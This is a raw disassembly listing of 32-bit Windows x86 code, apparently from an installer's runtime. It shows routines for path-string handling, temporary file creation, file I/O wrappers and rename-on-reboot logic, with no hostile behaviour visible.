  405ee7:	ff 15 38 81 40 00    	call   *0x408138
  405eed:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405ef1:	74 05                	je     0x405ef8
  405ef3:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405ef8:	33 f6                	xor    %esi,%esi
  405efa:	39 75 08             	cmp    %esi,0x8(%ebp)
  405efd:	74 4b                	je     0x405f4a
  405eff:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405f02:	75 08                	jne    0x405f0c
  405f04:	ff 05 e8 9a 42 00    	incl   0x429ae8
  405f0a:	eb 3e                	jmp    0x405f4a
  405f0c:	57                   	push   %edi
  405f0d:	e8 cd 0a 00 00       	call   0x4069df
  405f12:	85 c0                	test   %eax,%eax
  405f14:	74 34                	je     0x405f4a
  405f16:	57                   	push   %edi
  405f17:	e8 35 00 00 00       	call   0x405f51
  405f1c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405f1f:	0c 01                	or     $0x1,%al
  405f21:	50                   	push   %eax
  405f22:	57                   	push   %edi
  405f23:	e8 1e fe ff ff       	call   0x405d46
  405f28:	85 c0                	test   %eax,%eax
  405f2a:	75 16                	jne    0x405f42
  405f2c:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405f2f:	74 d3                	je     0x405f04
  405f31:	57                   	push   %edi
  405f32:	6a f1                	push   $0xfffffff1
  405f34:	e8 ce f7 ff ff       	call   0x405707
  405f39:	56                   	push   %esi
  405f3a:	57                   	push   %edi
  405f3b:	e8 02 05 00 00       	call   0x406442
  405f40:	eb 08                	jmp    0x405f4a
  405f42:	57                   	push   %edi
  405f43:	6a e5                	push   $0xffffffe5
  405f45:	e8 bd f7 ff ff       	call   0x405707
  405f4a:	5f                   	pop    %edi
  405f4b:	5e                   	pop    %esi
  405f4c:	5b                   	pop    %ebx
  405f4d:	c9                   	leave
  405f4e:	c2 08 00             	ret    $0x8
  405f51:	56                   	push   %esi
  405f52:	8b 74 24 08          	mov    0x8(%esp),%esi
  405f56:	56                   	push   %esi
  405f57:	e8 3c 07 00 00       	call   0x406698
  405f5c:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405f5f:	50                   	push   %eax
  405f60:	56                   	push   %esi
  405f61:	ff 15 fc 81 40 00    	call   *0x4081fc
  405f67:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405f6b:	74 0b                	je     0x405f78
  405f6d:	68 14 a0 40 00       	push   $0x40a014
  405f72:	56                   	push   %esi
  405f73:	e8 26 07 00 00       	call   0x40669e
  405f78:	8b c6                	mov    %esi,%eax
  405f7a:	5e                   	pop    %esi
  405f7b:	c2 04 00             	ret    $0x4
  405f7e:	8b 44 24 04          	mov    0x4(%esp),%eax
  405f82:	eb 0e                	jmp    0x405f92
  405f84:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405f89:	74 0f                	je     0x405f9a
  405f8b:	50                   	push   %eax
  405f8c:	ff 15 08 82 40 00    	call   *0x408208
  405f92:	66 8b 08             	mov    (%eax),%cx
  405f95:	66 85 c9             	test   %cx,%cx
  405f98:	75 ea                	jne    0x405f84
  405f9a:	c2 08 00             	ret    $0x8
  405f9d:	56                   	push   %esi
  405f9e:	8b 74 24 08          	mov    0x8(%esp),%esi
  405fa2:	56                   	push   %esi
  405fa3:	e8 f0 06 00 00       	call   0x406698
  405fa8:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405fab:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405faf:	74 0c                	je     0x405fbd
  405fb1:	50                   	push   %eax
  405fb2:	56                   	push   %esi
  405fb3:	ff 15 fc 81 40 00    	call   *0x4081fc
  405fb9:	3b c6                	cmp    %esi,%eax
  405fbb:	77 ee                	ja     0x405fab
  405fbd:	66 83 20 00          	andw   $0x0,(%eax)
  405fc1:	83 c0 02             	add    $0x2,%eax
  405fc4:	5e                   	pop    %esi
  405fc5:	c2 04 00             	ret    $0x4
  405fc8:	8b 54 24 04          	mov    0x4(%esp),%edx
  405fcc:	66 8b 0a             	mov    (%edx),%cx
  405fcf:	8b c1                	mov    %ecx,%eax
  405fd1:	0c 20                	or     $0x20,%al
  405fd3:	66 83 f9 5c          	cmp    $0x5c,%cx
  405fd7:	75 06                	jne    0x405fdf
  405fd9:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405fdd:	74 13                	je     0x405ff2
  405fdf:	66 3d 61 00          	cmp    $0x61,%ax
  405fe3:	72 12                	jb     0x405ff7
  405fe5:	66 3d 7a 00          	cmp    $0x7a,%ax
  405fe9:	77 0c                	ja     0x405ff7
  405feb:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405ff0:	75 05                	jne    0x405ff7
  405ff2:	33 c0                	xor    %eax,%eax
  405ff4:	40                   	inc    %eax
  405ff5:	eb 02                	jmp    0x405ff9
  405ff7:	33 c0                	xor    %eax,%eax
  405ff9:	c2 04 00             	ret    $0x4
  405ffc:	53                   	push   %ebx
  405ffd:	56                   	push   %esi
  405ffe:	8b 35 08 82 40 00    	mov    0x408208,%esi
  406004:	57                   	push   %edi
  406005:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406009:	57                   	push   %edi
  40600a:	ff d6                	call   *%esi
  40600c:	8b d8                	mov    %eax,%ebx
  40600e:	53                   	push   %ebx
  40600f:	ff d6                	call   *%esi
  406011:	66 8b 0f             	mov    (%edi),%cx
  406014:	66 85 c9             	test   %cx,%cx
  406017:	74 12                	je     0x40602b
  406019:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  40601d:	75 0c                	jne    0x40602b
  40601f:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  406024:	75 05                	jne    0x40602b
  406026:	50                   	push   %eax
  406027:	ff d6                	call   *%esi
  406029:	eb 28                	jmp    0x406053
  40602b:	66 83 f9 5c          	cmp    $0x5c,%cx
  40602f:	75 20                	jne    0x406051
  406031:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  406035:	75 1a                	jne    0x406051
  406037:	6a 02                	push   $0x2
  406039:	5e                   	pop    %esi
  40603a:	6a 5c                	push   $0x5c
  40603c:	50                   	push   %eax
  40603d:	4e                   	dec    %esi
  40603e:	e8 3b ff ff ff       	call   0x405f7e
  406043:	66 83 38 00          	cmpw   $0x0,(%eax)
  406047:	74 08                	je     0x406051
  406049:	40                   	inc    %eax
  40604a:	40                   	inc    %eax
  40604b:	85 f6                	test   %esi,%esi
  40604d:	75 eb                	jne    0x40603a
  40604f:	eb 02                	jmp    0x406053
  406051:	33 c0                	xor    %eax,%eax
  406053:	5f                   	pop    %edi
  406054:	5e                   	pop    %esi
  406055:	5b                   	pop    %ebx
  406056:	c2 04 00             	ret    $0x4
  406059:	56                   	push   %esi
  40605a:	57                   	push   %edi
  40605b:	ff 74 24 0c          	push   0xc(%esp)
  40605f:	be 50 57 42 00       	mov    $0x425750,%esi
  406064:	56                   	push   %esi
  406065:	e8 18 06 00 00       	call   0x406682
  40606a:	56                   	push   %esi
  40606b:	e8 8c ff ff ff       	call   0x405ffc
  406070:	8b f8                	mov    %eax,%edi
  406072:	85 ff                	test   %edi,%edi
  406074:	75 04                	jne    0x40607a
  406076:	33 c0                	xor    %eax,%eax
  406078:	eb 58                	jmp    0x4060d2
  40607a:	57                   	push   %edi
  40607b:	e8 b0 08 00 00       	call   0x406930
  406080:	f6 05 78 9a 42 00 80 	testb  $0x80,0x429a78
  406087:	74 0e                	je     0x406097
  406089:	66 8b 07             	mov    (%edi),%ax
  40608c:	66 85 c0             	test   %ax,%ax
  40608f:	74 e5                	je     0x406076
  406091:	66 3d 5c 00          	cmp    $0x5c,%ax
  406095:	74 df                	je     0x406076
  406097:	2b fe                	sub    %esi,%edi
  406099:	d1 ff                	sar    $1,%edi
  40609b:	eb 14                	jmp    0x4060b1
  40609d:	e8 3d 09 00 00       	call   0x4069df
  4060a2:	85 c0                	test   %eax,%eax
  4060a4:	74 05                	je     0x4060ab
  4060a6:	f6 00 10             	testb  $0x10,(%eax)
  4060a9:	74 cb                	je     0x406076
  4060ab:	56                   	push   %esi
  4060ac:	e8 ec fe ff ff       	call   0x405f9d
  4060b1:	56                   	push   %esi
  4060b2:	e8 e1 05 00 00       	call   0x406698
  4060b7:	3b c7                	cmp    %edi,%eax
  4060b9:	56                   	push   %esi
  4060ba:	7f e1                	jg     0x40609d
  4060bc:	e8 90 fe ff ff       	call   0x405f51
  4060c1:	56                   	push   %esi
  4060c2:	ff 15 dc 80 40 00    	call   *0x4080dc
  4060c8:	33 c9                	xor    %ecx,%ecx
  4060ca:	83 f8 ff             	cmp    $0xffffffff,%eax
  4060cd:	0f 95 c1             	setne  %cl
  4060d0:	8b c1                	mov    %ecx,%eax
  4060d2:	5f                   	pop    %edi
  4060d3:	5e                   	pop    %esi
  4060d4:	c2 04 00             	ret    $0x4
  4060d7:	55                   	push   %ebp
  4060d8:	8b ec                	mov    %esp,%ebp
  4060da:	51                   	push   %ecx
  4060db:	53                   	push   %ebx
  4060dc:	56                   	push   %esi
  4060dd:	57                   	push   %edi
  4060de:	8b 3d 28 81 40 00    	mov    0x408128,%edi
  4060e4:	ff 75 0c             	push   0xc(%ebp)
  4060e7:	ff d7                	call   *%edi
  4060e9:	8b 75 08             	mov    0x8(%ebp),%esi
  4060ec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060ef:	eb 27                	jmp    0x406118
  4060f1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4060f4:	ff 75 0c             	push   0xc(%ebp)
  4060f7:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  4060fa:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  4060fe:	56                   	push   %esi
  4060ff:	ff 15 70 80 40 00    	call   *0x408070
  406105:	85 c0                	test   %eax,%eax
  406107:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40610a:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  40610d:	74 1a                	je     0x406129
  40610f:	56                   	push   %esi
  406110:	ff 15 74 82 40 00    	call   *0x408274
  406116:	8b f0                	mov    %eax,%esi
  406118:	56                   	push   %esi
  406119:	ff d7                	call   *%edi
  40611b:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40611e:	7d d1                	jge    0x4060f1
  406120:	33 c0                	xor    %eax,%eax
  406122:	5f                   	pop    %edi
  406123:	5e                   	pop    %esi
  406124:	5b                   	pop    %ebx
  406125:	c9                   	leave
  406126:	c2 08 00             	ret    $0x8
  406129:	8b c6                	mov    %esi,%eax
  40612b:	eb f5                	jmp    0x406122
  40612d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406131:	56                   	push   %esi
  406132:	8b 74 24 10          	mov    0x10(%esp),%esi
  406136:	85 f6                	test   %esi,%esi
  406138:	76 0f                	jbe    0x406149
  40613a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40613e:	2b c1                	sub    %ecx,%eax
  406140:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  406143:	88 11                	mov    %dl,(%ecx)
  406145:	41                   	inc    %ecx
  406146:	4e                   	dec    %esi
  406147:	75 f7                	jne    0x406140
  406149:	5e                   	pop    %esi
  40614a:	c2 0c 00             	ret    $0xc
  40614d:	56                   	push   %esi
  40614e:	ff 74 24 08          	push   0x8(%esp)
  406152:	ff 15 dc 80 40 00    	call   *0x4080dc
  406158:	8b f0                	mov    %eax,%esi
  40615a:	83 fe ff             	cmp    $0xffffffff,%esi
  40615d:	74 0d                	je     0x40616c
  40615f:	24 fe                	and    $0xfe,%al
  406161:	50                   	push   %eax
  406162:	ff 74 24 0c          	push   0xc(%esp)
  406166:	ff 15 d8 80 40 00    	call   *0x4080d8
  40616c:	8b c6                	mov    %esi,%eax
  40616e:	5e                   	pop    %esi
  40616f:	c2 04 00             	ret    $0x4
  406172:	ff 74 24 04          	push   0x4(%esp)
  406176:	ff 15 dc 80 40 00    	call   *0x4080dc
  40617c:	8b c8                	mov    %eax,%ecx
  40617e:	6a 00                	push   $0x0
  406180:	41                   	inc    %ecx
  406181:	f7 d9                	neg    %ecx
  406183:	1b c9                	sbb    %ecx,%ecx
  406185:	23 c8                	and    %eax,%ecx
  406187:	51                   	push   %ecx
  406188:	ff 74 24 14          	push   0x14(%esp)
  40618c:	6a 00                	push   $0x0
  40618e:	6a 01                	push   $0x1
  406190:	ff 74 24 1c          	push   0x1c(%esp)
  406194:	ff 74 24 1c          	push   0x1c(%esp)
  406198:	ff 15 cc 80 40 00    	call   *0x4080cc
  40619e:	c2 0c 00             	ret    $0xc
  4061a1:	55                   	push   %ebp
  4061a2:	8b ec                	mov    %esp,%ebp
  4061a4:	51                   	push   %ecx
  4061a5:	51                   	push   %ecx
  4061a6:	56                   	push   %esi
  4061a7:	8b 75 08             	mov    0x8(%ebp),%esi
  4061aa:	57                   	push   %edi
  4061ab:	6a 64                	push   $0x64
  4061ad:	5f                   	pop    %edi
  4061ae:	a1 a8 a5 40 00       	mov    0x40a5a8,%eax
  4061b3:	4f                   	dec    %edi
  4061b4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4061b7:	a1 ac a5 40 00       	mov    0x40a5ac,%eax
  4061bc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4061bf:	ff 15 d0 80 40 00    	call   *0x4080d0
  4061c5:	6a 1a                	push   $0x1a
  4061c7:	33 d2                	xor    %edx,%edx
  4061c9:	59                   	pop    %ecx
  4061ca:	f7 f1                	div    %ecx
  4061cc:	56                   	push   %esi
  4061cd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4061d0:	6a 00                	push   $0x0
  4061d2:	50                   	push   %eax
  4061d3:	ff 75 0c             	push   0xc(%ebp)
  4061d6:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  4061da:	ff 15 74 80 40 00    	call   *0x408074
  4061e0:	85 c0                	test   %eax,%eax
  4061e2:	75 0d                	jne    0x4061f1
  4061e4:	85 ff                	test   %edi,%edi
  4061e6:	75 c6                	jne    0x4061ae
  4061e8:	66 21 3e             	and    %di,(%esi)
  4061eb:	5f                   	pop    %edi
  4061ec:	5e                   	pop    %esi
  4061ed:	c9                   	leave
  4061ee:	c2 08 00             	ret    $0x8
  4061f1:	8b c6                	mov    %esi,%eax
  4061f3:	eb f6                	jmp    0x4061eb
  4061f5:	55                   	push   %ebp
  4061f6:	8b ec                	mov    %esp,%ebp
  4061f8:	56                   	push   %esi
  4061f9:	8b 75 10             	mov    0x10(%ebp),%esi
  4061fc:	8d 45 10             	lea    0x10(%ebp),%eax
  4061ff:	6a 00                	push   $0x0
  406201:	50                   	push   %eax
  406202:	56                   	push   %esi
  406203:	ff 75 0c             	push   0xc(%ebp)
  406206:	ff 75 08             	push   0x8(%ebp)
  406209:	ff 15 30 81 40 00    	call   *0x408130
  40620f:	85 c0                	test   %eax,%eax
  406211:	74 0a                	je     0x40621d
  406213:	3b 75 10             	cmp    0x10(%ebp),%esi
  406216:	75 05                	jne    0x40621d
  406218:	33 c0                	xor    %eax,%eax
  40621a:	40                   	inc    %eax
  40621b:	eb 02                	jmp    0x40621f
  40621d:	33 c0                	xor    %eax,%eax
  40621f:	5e                   	pop    %esi
  406220:	5d                   	pop    %ebp
  406221:	c2 0c 00             	ret    $0xc
  406224:	55                   	push   %ebp
  406225:	8b ec                	mov    %esp,%ebp
  406227:	56                   	push   %esi
  406228:	8b 75 10             	mov    0x10(%ebp),%esi
  40622b:	8d 45 10             	lea    0x10(%ebp),%eax
  40622e:	6a 00                	push   $0x0
  406230:	50                   	push   %eax
  406231:	56                   	push   %esi
  406232:	ff 75 0c             	push   0xc(%ebp)
  406235:	ff 75 08             	push   0x8(%ebp)
  406238:	ff 15 b8 80 40 00    	call   *0x4080b8
  40623e:	85 c0                	test   %eax,%eax
  406240:	74 0a                	je     0x40624c
  406242:	3b 75 10             	cmp    0x10(%ebp),%esi
  406245:	75 05                	jne    0x40624c
  406247:	33 c0                	xor    %eax,%eax
  406249:	40                   	inc    %eax
  40624a:	eb 02                	jmp    0x40624e
  40624c:	33 c0                	xor    %eax,%eax
  40624e:	5e                   	pop    %esi
  40624f:	5d                   	pop    %ebp
  406250:	c2 0c 00             	ret    $0xc
  406253:	55                   	push   %ebp
  406254:	8b ec                	mov    %esp,%ebp
  406256:	53                   	push   %ebx
  406257:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40625a:	56                   	push   %esi
  40625b:	8b 35 34 81 40 00    	mov    0x408134,%esi
  406261:	57                   	push   %edi
  406262:	33 ff                	xor    %edi,%edi
  406264:	6a 01                	push   $0x1
  406266:	57                   	push   %edi
  406267:	57                   	push   %edi
  406268:	53                   	push   %ebx
  406269:	ff d6                	call   *%esi
  40626b:	85 c0                	test   %eax,%eax
  40626d:	75 4f                	jne    0x4062be
  40626f:	8d 45 0a             	lea    0xa(%ebp),%eax
  406272:	6a 02                	push   $0x2
  406274:	50                   	push   %eax
  406275:	53                   	push   %ebx
  406276:	e8 7a ff ff ff       	call   0x4061f5
  40627b:	85 c0                	test   %eax,%eax
  40627d:	74 0c                	je     0x40628b
  40627f:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  406285:	75 04                	jne    0x40628b
  406287:	33 c0                	xor    %eax,%eax
  406289:	eb 36                	jmp    0x4062c1
  40628b:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40628e:	74 28                	je     0x4062b8
  406290:	6a 01                	push   $0x1
  406292:	57                   	push   %edi
  406293:	57                   	push   %edi
  406294:	53                   	push   %ebx
  406295:	ff d6                	call   *%esi
  406297:	85 c0                	test   %eax,%eax
  406299:	75 1d                	jne    0x4062b8
  40629b:	6a 02                	push   $0x2
  40629d:	68 14 84 40 00       	push   $0x408414
  4062a2:	53                   	push   %ebx
  4062a3:	e8 7c ff ff ff       	call   0x406224
  4062a8:	f7 d8                	neg    %eax
  4062aa:	1b c0                	sbb    %eax,%eax
  4062ac:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  4062b1:	05 05 40 00 80       	add    $0x80004005,%eax
  4062b6:	eb 09                	jmp    0x4062c1
  4062b8:	57                   	push   %edi
  4062b9:	57                   	push   %edi
  4062ba:	57                   	push   %edi
  4062bb:	53                   	push   %ebx
  4062bc:	ff d6                	call   *%esi
  4062be:	33 c0                	xor    %eax,%eax
  4062c0:	40                   	inc    %eax
  4062c1:	5f                   	pop    %edi
  4062c2:	5e                   	pop    %esi
  4062c3:	5b                   	pop    %ebx
  4062c4:	5d                   	pop    %ebp
  4062c5:	c2 08 00             	ret    $0x8
  4062c8:	53                   	push   %ebx
  4062c9:	8b 1d ec 80 40 00    	mov    0x4080ec,%ebx
  4062cf:	55                   	push   %ebp
  4062d0:	56                   	push   %esi
  4062d1:	8b 74 24 14          	mov    0x14(%esp),%esi
  4062d5:	57                   	push   %edi
  4062d6:	85 f6                	test   %esi,%esi
  4062d8:	c7 05 e8 65 42 00 4e 	movl   $0x55004e,0x4265e8
  4062df:	00 55 00 
  4062e2:	c7 05 ec 65 42 00 4c 	movl   $0x4c,0x4265ec
  4062e9:	00 00 00 
  4062ec:	bf 00 04 00 00       	mov    $0x400,%edi
  4062f1:	bd e8 65 42 00       	mov    $0x4265e8,%ebp
  4062f6:	74 26                	je     0x40631e
  4062f8:	6a 01                	push   $0x1
  4062fa:	6a 00                	push   $0x0
  4062fc:	56                   	push   %esi
  4062fd:	e8 70 fe ff ff       	call   0x406172
  406302:	50                   	push   %eax
  406303:	ff 15 fc 80 40 00    	call   *0x4080fc
  406309:	57                   	push   %edi
  40630a:	55                   	push   %ebp
  40630b:	56                   	push   %esi
  40630c:	ff d3                	call   *%ebx
  40630e:	85 c0                	test   %eax,%eax
  406310:	0f 84 27 01 00 00    	je     0x40643d
  406316:	3b c7                	cmp    %edi,%eax
  406318:	0f 8f 1f 01 00 00    	jg     0x40643d
  40631e:	be e8 6d 42 00       	mov    $0x426de8,%esi
  406323:	57                   	push   %edi
  406324:	56                   	push   %esi
  406325:	ff 74 24 1c          	push   0x1c(%esp)
  406329:	ff d3                	call   *%ebx
  40632b:	85 c0                	test   %eax,%eax
  40632d:	0f 84 0a 01 00 00    	je     0x40643d
  406333:	3b c7                	cmp    %edi,%eax
  406335:	0f 8f 02 01 00 00    	jg     0x40643d
  40633b:	56                   	push   %esi
  40633c:	55                   	push   %ebp
  40633d:	68 c0 a5 40 00       	push   $0x40a5c0
  406342:	68 e8 61 42 00       	push   $0x4261e8
  406347:	ff 15 78 82 40 00    	call   *0x408278
  40634d:	8b d8                	mov    %eax,%ebx
  40634f:	a1 70 9a 42 00       	mov    0x429a70,%eax
  406354:	83 c4 10             	add    $0x10,%esp
  406357:	ff b0 28 01 00 00    	push   0x128(%eax)
  40635d:	56                   	push   %esi
  40635e:	e8 5c 03 00 00       	call   0x4066bf
  406363:	6a 04                	push   $0x4
  406365:	68 00 00 00 c0       	push   $0xc0000000
  40636a:	56                   	push   %esi
  40636b:	e8 02 fe ff ff       	call   0x406172
  406370:	8b e8                	mov    %eax,%ebp
  406372:	83 fd ff             	cmp    $0xffffffff,%ebp
  406375:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  406379:	0f 84 be 00 00 00    	je     0x40643d
  40637f:	6a 00                	push   $0x0
  406381:	55                   	push   %ebp
  406382:	ff 15 c8 80 40 00    	call   *0x4080c8
  406388:	8b f8                	mov    %eax,%edi
  40638a:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  40638e:	50                   	push   %eax
  40638f:	6a 40                	push   $0x40
  406391:	ff 15 10 81 40 00    	call   *0x408110
  406397:	8b f0                	mov    %eax,%esi
  406399:	85 f6                	test   %esi,%esi
  40639b:	0f 84 95 00 00 00    	je     0x406436
  4063a1:	57                   	push   %edi
  4063a2:	56                   	push   %esi
  4063a3:	55                   	push   %ebp
  4063a4:	e8 4c fe ff ff       	call   0x4061f5
  4063a9:	85 c0                	test   %eax,%eax
  4063ab:	0f 84 85 00 00 00    	je     0x406436
  4063b1:	68 b4 a5 40 00       	push   $0x40a5b4
  4063b6:	56                   	push   %esi
  4063b7:	e8 1b fd ff ff       	call   0x4060d7
  4063bc:	85 c0                	test   %eax,%eax
  4063be:	75 14                	jne    0x4063d4
  4063c0:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  4063c3:	68 b4 a5 40 00       	push   $0x40a5b4
  4063c8:	50                   	push   %eax
  4063c9:	ff 15 4c 81 40 00    	call   *0x40814c
  4063cf:	83 c7 0a             	add    $0xa,%edi
  4063d2:	eb 35                	jmp    0x406409
  4063d4:	83 c0 0a             	add    $0xa,%eax
  4063d7:	68 b0 a5 40 00       	push   $0x40a5b0
  4063dc:	50                   	push   %eax
  4063dd:	e8 f5 fc ff ff       	call   0x4060d7
  4063e2:	8b e8                	mov    %eax,%ebp
  4063e4:	85 ed                	test   %ebp,%ebp
  4063e6:	74 1d                	je     0x406405
  4063e8:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  4063eb:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  4063ee:	eb 06                	jmp    0x4063f6
  4063f0:	8a 11                	mov    (%ecx),%dl
  4063f2:	88 10                	mov    %dl,(%eax)
  4063f4:	48                   	dec    %eax
  4063f5:	49                   	dec    %ecx
  4063f6:	3b cd                	cmp    %ebp,%ecx
  4063f8:	77 f6                	ja     0x4063f0
  4063fa:	2b ee                	sub    %esi,%ebp
  4063fc:	45                   	inc    %ebp
  4063fd:	8b c5                	mov    %ebp,%eax
  4063ff:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406403:	eb 06                	jmp    0x40640b
  406405:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406409:	8b c7                	mov    %edi,%eax
  40640b:	53                   	push   %ebx
  40640c:	03 c6                	add    %esi,%eax
  40640e:	68 e8 61 42 00       	push   $0x4261e8
  406413:	50                   	push   %eax
  406414:	e8 14 fd ff ff       	call   0x40612d
  406419:	33 c0                	xor    %eax,%eax
  40641b:	50                   	push   %eax
  40641c:	50                   	push   %eax
  40641d:	50                   	push   %eax
  40641e:	55                   	push   %ebp
  40641f:	ff 15 34 81 40 00    	call   *0x408134
  406425:	03 fb                	add    %ebx,%edi
  406427:	57                   	push   %edi
  406428:	56                   	push   %esi
  406429:	55                   	push   %ebp
  40642a:	e8 f5 fd ff ff       	call   0x406224
  40642f:	56                   	push   %esi
  406430:	ff 15 0c 81 40 00    	call   *0x40810c
  406436:	55                   	push   %ebp
  406437:	ff 15 fc 80 40 00    	call   *0x4080fc
  40643d:	5f                   	pop    %edi
  40643e:	5e                   	pop    %esi
  40643f:	5d                   	pop    %ebp
  406440:	5b                   	pop    %ebx
  406441:	c3                   	ret
  406442:	6a 05                	push   $0x5
  406444:	ff 74 24 0c          	push   0xc(%esp)
  406448:	ff 74 24 0c          	push   0xc(%esp)
  40644c:	ff 15 50 81 40 00    	call   *0x408150
  406452:	85 c0                	test   %eax,%eax
  406454:	75 0f                	jne    0x406465
  406456:	ff 74 24 08          	push   0x8(%esp)
  40645a:	ff 74 24 08          	push   0x8(%esp)
  40645e:	e8 65 fe ff ff       	call   0x4062c8
  406463:	59                   	pop    %ecx
  406464:	59                   	pop    %ecx
  406465:	ff 05 f0 9a 42 00    	incl   0x429af0
  40646b:	c2 08 00             	ret    $0x8
  40646e:	53                   	push   %ebx
  40646f:	33 db                	xor    %ebx,%ebx
  406471:	38 1d 1c 9b 42 00    	cmp    %bl,0x429b1c
  406477:	56                   	push   %esi
  406478:	8b 74 24 10          	mov    0x10(%esp),%esi
  40647c:	57                   	push   %edi
  40647d:	0f 9c c3             	setl   %bl
  406480:	8b 06                	mov    (%esi),%eax
  406482:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406486:	f7 db                	neg    %ebx
  406488:	1b db                	sbb    %ebx,%ebx
  40648a:	32 db                	xor    %bl,%bl
  40648c:	81 c3 00 01 00 00    	add    $0x100,%ebx
  406492:	a8 20                	test   $0x20,%al
  406494:	74 32                	je     0x4064c8
  406496:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  40649c:	74 2a                	je     0x4064c8
  40649e:	8b cf                	mov    %edi,%ecx
  4064a0:	ba 00 03 00 00       	mov    $0x300,%edx
  4064a5:	c1 e9 15             	shr    $0x15,%ecx
  4064a8:	23 ca                	and    %edx,%ecx
  4064aa:	3b ca                	cmp    %edx,%ecx
  4064ac:	75 0a                	jne    0x4064b8
  4064ae:	8b cb                	mov    %ebx,%ecx
  4064b0:	f7 d1                	not    %ecx
  4064b2:	23 0d 10 9b 42 00    	and    0x429b10,%ecx
  4064b8:	80 e4 fe             	and    $0xfe,%ah
  4064bb:	0b c1                	or     %ecx,%eax
  4064bd:	80 e4 fd             	and    $0xfd,%ah
  4064c0:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  4064c6:	eb 0d                	jmp    0x4064d5
  4064c8:	a9 00 00 10 00       	test   $0x100000,%eax
  4064cd:	74 06                	je     0x4064d5
  4064cf:	0b 05 10 9b 42 00    	or     0x429b10,%eax
  4064d5:	8b c8                	mov    %eax,%ecx
  4064d7:	23 c3                	and    %ebx,%eax
  4064d9:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  4064df:	f7 d8                	neg    %eax
  4064e1:	1b c0                	sbb    %eax,%eax
  4064e3:	89 0e                	mov    %ecx,(%esi)
  4064e5:	f7 d0                	not    %eax
  4064e7:	23 c7                	and    %edi,%eax
  4064e9:	5f                   	pop    %edi
  4064ea:	5e                   	pop    %esi
  4064eb:	5b                   	pop    %ebx
  4064ec:	c2 08 00             	ret    $0x8
  4064ef:	55                   	push   %ebp
  4064f0:	8b ec                	mov    %esp,%ebp
  4064f2:	8d 45 10             	lea    0x10(%ebp),%eax
  4064f5:	50                   	push   %eax
  4064f6:	ff 75 08             	push   0x8(%ebp)
  4064f9:	e8 70 ff ff ff       	call   0x40646e
  4064fe:	85 c0                	test   %eax,%eax
  406500:	75 05                	jne    0x406507
  406502:	6a 06                	push   $0x6
  406504:	58                   	pop    %eax
  406505:	eb 12                	jmp    0x406519
  406507:	ff 75 14             	push   0x14(%ebp)
  40650a:	ff 75 10             	push   0x10(%ebp)
  40650d:	6a 00                	push   $0x0
  40650f:	ff 75 0c             	push   0xc(%ebp)
  406512:	50                   	push   %eax
  406513:	ff 15 28 80 40 00    	call   *0x408028
  406519:	5d                   	pop    %ebp
  40651a:	c2 10 00             	ret    $0x10
  40651d:	55                   	push   %ebp
  40651e:	8b ec                	mov    %esp,%ebp
  406520:	8d 45 10             	lea    0x10(%ebp),%eax
  406523:	50                   	push   %eax
  406524:	ff 75 08             	push   0x8(%ebp)
  406527:	e8 42 ff ff ff       	call   0x40646e
  40652c:	33 c9                	xor    %ecx,%ecx
  40652e:	3b c1                	cmp    %ecx,%eax
  406530:	75 05                	jne    0x406537
  406532:	6a 06                	push   $0x6
  406534:	58                   	pop    %eax
  406535:	eb 15                	jmp    0x40654c
  406537:	51                   	push   %ecx
  406538:	ff 75 14             	push   0x14(%ebp)
  40653b:	51                   	push   %ecx
  40653c:	ff 75 10             	push   0x10(%ebp)
  40653f:	51                   	push   %ecx
  406540:	51                   	push   %ecx
  406541:	51                   	push   %ecx
  406542:	ff 75 0c             	push   0xc(%ebp)
  406545:	50                   	push   %eax
  406546:	ff 15 2c 80 40 00    	call   *0x40802c
  40654c:	5d                   	pop    %ebp
  40654d:	c2 10 00             	ret    $0x10
  406550:	55                   	push   %ebp
  406551:	8b ec                	mov    %esp,%ebp
  406553:	51                   	push   %ecx
  406554:	8d 45 18             	lea    0x18(%ebp),%eax
  406557:	56                   	push   %esi
  406558:	50                   	push   %eax
  406559:	8b 45 18             	mov    0x18(%ebp),%eax
  40655c:	f7 d8                	neg    %eax
  40655e:	1b c0                	sbb    %eax,%eax
